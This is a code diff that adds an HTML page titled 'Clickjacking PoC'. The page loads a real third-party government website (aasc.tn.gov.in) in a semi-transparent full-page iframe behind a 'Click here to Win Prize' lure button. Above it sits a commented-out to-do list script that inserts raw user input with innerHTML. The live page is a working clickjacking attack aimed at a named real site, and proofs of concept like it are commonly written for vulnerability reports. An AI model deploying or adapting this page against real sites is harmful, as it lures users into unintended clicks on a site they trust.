@@ -1,0 +1,32 @@
+<!-- <input type="text" id="inputs">
+<button onclick="adding()">Add</button> 
+<ul id="list-container">
+    <li>Walking
+        <button type="button" onclick="dels(event)">Delete</button>
+    </li>
+</ul>
+
+<script>
+    var list = document.getElementById("list-container")
+    var inr = document.getElementById("inputs")
+    
+    function adding(){
+    var li = document.createElement("li")
+    li.innerHTML=inr.value + "<button onclick='dels(event)'>Delete</buttton>"
+    list.append(li)
+    }
+    function dels(event){
+          event.target.parentElement.remove()
+    }
+</script> -->
+
+<!DOCTYPE html>
+<html>
+<head>
+<title>Clickjacking PoC</title>
+</head>
+<body>
+<input type=button value="Click here to Win Prize" style="z-index:-1;left:1200px;position:relative;top:800px;"/>
+<iframe src="https://aasc.tn.gov.in/" width=100% height=100% style="opacity: 0.5;"></iframe>
+</body>
+</html>
